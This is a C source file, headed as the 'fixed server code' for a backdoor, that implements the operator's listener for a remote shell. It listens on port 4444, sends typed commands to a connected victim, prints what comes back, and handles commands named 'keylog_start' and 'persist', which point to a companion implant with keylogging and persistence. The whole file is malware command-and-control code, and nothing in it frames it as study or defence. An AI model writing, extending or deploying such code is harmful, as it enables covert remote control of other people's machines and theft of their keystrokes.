// FIXED SERVER CODE AS PER THE UPDATED BACKDOOR
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error Setting TCP Socket Option.\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    server_address.sin_port = htons(4444);

    if (bind(sock, (struct sockaddr *)&server_address, sizeof(server_address)) < 0) {
        perror("Bind failed");
        return 1;
    }
    
    listen(sock, 5);
    client_length = sizeof(client_address);
    
    printf("[+] Server listening on port 4444\n");
    
    while (1) {
        client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);
        printf("[+] Connection from %s\n", inet_ntoa(client_address.sin_addr));
        
        while (1) {
            jump:
            bzero(buffer, sizeof(buffer));
            bzero(response, sizeof(response));

            printf("SHELL$: ", inet_ntoa(client_address.sin_addr));
            fgets(buffer, sizeof(buffer), stdin);
            strtok(buffer, "\n");

            if (send(client_socket, buffer, strlen(buffer), 0) < 0) {
                printf("[-] Connection lost\n");
                break;
            }

            if (strncmp("q", buffer, 1) == 0) {
                close(client_socket);
                break;
            }
            else if (strncmp("cd ", buffer, 3) == 0) {
                goto jump;
            }
            else if (strncmp("keylog_start", buffer, 12) == 0) {
                goto jump;
            }
            else if (strncmp("persist", buffer, 7) == 0) {
                goto jump;
            }
            else {
                int total_received = 0;
                while (total_received < sizeof(response) - 1) {
                    int bytes_received = recv(client_socket, response + total_received, 
                                            sizeof(response) - total_received - 1, 0);
                    if (bytes_received <= 0) break;
                    total_received += bytes_received;
                    
                    // Check if we've received the complete response
                    if (total_received > 2 && 
                        response[total_received-1] == '\0' || 
                        strstr(response, "##@END##") != NULL) {
                        break;
                    }
                }
                response[total_received] = '\0';
                printf("%s", response);
            }
        }
        close(client_socket);
    }
    close(sock);
    return 0;
}
